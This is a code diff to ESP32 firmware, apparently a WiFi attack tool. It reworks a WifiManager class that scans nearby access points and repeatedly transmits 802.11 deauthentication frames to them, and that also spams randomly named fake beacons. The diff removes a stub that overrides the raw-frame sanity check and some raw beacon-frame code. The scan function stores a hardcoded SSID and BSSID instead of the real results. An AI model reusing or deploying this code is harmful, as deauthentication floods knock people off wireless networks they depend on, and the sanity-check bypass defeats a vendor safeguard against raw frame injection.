@@ -3,14 +3,15 @@
 extern Logger l;
 extern Led led;
 
-int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-	return 0;
-}
-
 extern "C" {
 	esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
 	esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 }
+
+struct ap {
+	String ssid;
+	String bssid;
+};
 
 class WifiManager
 {
@@ -58,6 +59,51 @@ public:
 		}
 	}
 
+	void scanNetworksAndDeauth(int numPackets)
+	{
+		if (!updateScanAp()) {
+			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+			return;
+		}
+
+		esp_wifi_set_mode(WIFI_MODE_AP);
+		led.flash();
+
+		loop_deauth_ap = !loop_deauth_ap;
+	}
+
+	void accessPointLoop() {
+		esp_wifi_set_mode(WIFI_MODE_APSTA);
+		led.flash();
+
+		loop_spam_ap = !loop_spam_ap;
+
+		l.log(Logger::INFO, loop_spam_ap ? "Starting access point spam loop" : "Stopping access point spam loop");
+	}
+
+	void scanNetworks()
+	{
+		if (!updateScanAp()) {
+			l.log(Logger::ERROR, "Failed to scan nearby AP");
+			return;
+		}
+
+		led.flash();
+		
+		for (int i = 0; i < (sizeof(scanned_ap) / sizeof(scanned_ap[0])); i++) {
+			Serial.print("Network SSID: ");
+			Serial.print(scanned_ap[i].ssid);
+			Serial.print("(");
+			Serial.print(scanned_ap[i].bssid);
+			Serial.println(")");
+		}
+	}
+
+	void createAccessPoint(const char *apName, const char *apPassword)
+	{
+		WiFi.softAP(apName, apPassword);
+	}
+
 	void connectToWiFi(const char *ssid, const char *password)
 	{
 		WiFi.begin(ssid, password);
@@ -69,49 +115,20 @@ public:
 		Serial.println("Connected to WiFi.");
 	}
 
-	void scanNetworks()
-	{
-		l.log(Logger::INFO, "Scanning nearby APs...");
-		int numNetworks = WiFi.scanNetworks();
-		for (int i = 0; i < numNetworks; i++)
-		{
-			Serial.print("Network SSID: ");
-			Serial.print(WiFi.SSID(i));
-			Serial.print("(");
-			Serial.print(WiFi.BSSIDstr(i));
-			Serial.println(")");
-		}
-	}
-
-	void scanNetworksAndDeauth(int numPackets)
-	{
-		int numNetworks = WiFi.scanNetworks();
-		for (int i = 0; i < numNetworks; i++)
-		{
-			String ssid = WiFi.SSID(i);
-			String bssid = WiFi.BSSIDstr(i);
-			if (ssid.length() > 0)
-			{
-				sendDeauthPackets(ssid.c_str(), bssid.c_str(), numPackets);
-			}
-		}
-	}
-
-	void createAccessPoint(const char *apName, const char *apPassword)
-	{
-		WiFi.softAP(apName, apPassword);
-	}
-
-	void accessPointLoop() {
-		loop_spam_ap = !loop_spam_ap;
-		l.log(Logger::INFO, loop_spam_ap ? "Starting access point spam loop" : "Stopping access point spam loop");
-		led.flash();
-	}
-
 	void loop() {
 		if (loop_spam_ap) {
 			String name = "FS | " + utilities::gen_random_str(5);
 			beacon(name);
+		}
+
+		if (loop_deauth_ap) {
+			for (int i = 0; i < (sizeof(scanned_ap) / sizeof(scanned_ap[0])); i++) {
+				String ssid = scanned_ap[i].ssid;
+				String bssid = scanned_ap[i].bssid;
+				if (ssid.length() > 0) {
+					sendDeauthPackets(ssid.c_str(), bssid.c_str(), 3);
+				}
+			}
 		}
 	}
 
@@ -119,8 +136,10 @@ private:
 	int current_channel = 0;
 	wifi_init_config_t cfg;
     wifi_config_t ap_config;
+	ap scanned_ap[10]; // max 10 ap in the array
 	uint8_t original_mac_ap[6];
 	bool loop_spam_ap = false;
+	bool loop_deauth_ap = false;
 
 	void switchChannel() {
 		current_channel++;
@@ -149,6 +168,18 @@ private:
 		};
 
 		return esp_wifi_set_config(WIFI_IF_AP, &ap_config) == ESP_OK;
+	}
+
+	bool updateScanAp()
+	{
+		l.log(Logger::INFO, "Scanning nearby APs...");
+		int numNetworks = WiFi.scanNetworks();
+		for (int i = 0; i < (numNetworks > 10 ? 10 : numNetworks); i++) {
+			scanned_ap[i].ssid = "imx"; // WiFi.SSID(i);
+        	scanned_ap[i].bssid = "F6:AA:EA:92:ED:CB"; // WiFi.BSSIDstr(i);
+		}
+
+		return numNetworks != 0;
 	}
 
 	void sendDeauthPackets(const char* ssid, const char* bssid, int numPackets)
@@ -195,64 +226,20 @@ private:
 		// delay(100);
 	}
 
-	void beacon() {
-		switchChannel();
-
-		// packet[10] = packet[16] = random(256);
-		// packet[11] = packet[17] = random(256);
-		// packet[12] = packet[18] = random(256);
-		// packet[13] = packet[19] = random(256);
-		// packet[14] = packet[20] = random(256);
-		// packet[15] = packet[21] = random(256);
-		uint8_t* mac = utilities::rand_mac();
-
-		memcpy(&packet[10], mac, 6);
-		memcpy(&packet[16], mac, 6);
-
-		packet[37] = 6;
-
-		String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
-
-		packet[38] = alfa[random(65)];
-		packet[39] = alfa[random(65)];
-		packet[40] = alfa[random(65)];
-		packet[41] = alfa[random(65)];
-		packet[42] = alfa[random(65)];
-		packet[43] = alfa[random(65)];
-
-		packet[56] = current_channel;
-
-		uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
-
-		// Add everything that goes after the SSID
-		for(int i = 0; i < 12; i++) 
-			packet[38 + 6 + i] = postSSID[i];
-
-		for (int i = 0; i < 3; i++) {
-			esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), 0);
-			delay(1);
-		}
-		
-		l.log(Logger::INFO, String("Creating access point: mode rand"));
-		// delay(100);
-	}
-
 	void deauth(const char* t_mac) // void deauth(const char* ap_mac, const char* t_mac)
 	{
 		switchChannel();
-		// configure_wifi(current_channel);
 
 		uint8_t buffer[sizeof(deauth_packet)];
+    	memcpy(buffer, deauth_packet, sizeof(deauth_packet));
 
+		// memcpy(&buffer[4], t_mac, 6);
 		memcpy(&buffer[10], t_mac, 6);
 		memcpy(&buffer[16], t_mac, 6);
 
 		esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauth_packet), false);
 		// buffer[0] = 0xa0;
-		// esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauth_packet), false);
-
-		// delay(100);
+		// esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauth_frame_default), false);
 	}
 
 	uint8_t probe_packet[68] = {
@@ -342,16 +329,4 @@ private:
 		/* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
 		/* 107 - 108 */ 0x00, 0x00
 	};
-
-	    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
-                    /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
-                    /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
-                    /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
-                    /*22*/  0xc0, 0x6c, //Seq-ctl
-                    /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
-                    /*32*/  0x64, 0x00, //Beacon interval
-                    /*34*/  0x01, 0x04, //Capability info
-                    /* SSID */
-                    /*36*/  0x00
-                    };
 };
